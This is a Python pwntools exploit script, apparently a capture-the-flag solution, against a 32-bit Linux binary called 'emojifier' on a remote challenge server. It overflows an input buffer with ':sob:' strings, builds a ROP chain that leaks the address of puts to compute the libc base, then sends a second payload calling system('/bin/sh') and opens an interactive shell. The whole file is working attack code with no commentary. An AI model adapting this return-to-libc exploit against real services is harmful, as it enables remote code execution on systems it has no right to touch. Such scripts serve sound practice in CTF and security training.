#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="i386", os="linux")
context.log_level = 'debug'

exe = ELF("emojifier")
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "challs.ifctf.fibonhack.it", "10025"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

sla('emotions:\n\n', b'\x00'+b':sob:'*16+b'AA'+p32(0x0804c000)+p32(0x804c874)+p32(exe.sym[b'puts'])+p32(0x8049904)+p32(exe.got['puts']))
p.recvuntil('bop.', drop=True)
p.recvuntil('#\n', drop=True)

buff = p.recvuntil('\n',drop=True)
print(hexdump(buff))

libc.address = u32(buff[0:4]) - libc.sym['puts']
logbase()

payload = b'\x00'+b':sob:'*16+b'AA'+p32(0x0804c000)+p32(0x804c874)+p32(libc.sym[b'system'])+p32(libc.sym[b'exit'])+p32(next(libc.search(b'/bin/sh')))
sl(payload)

p.interactive()

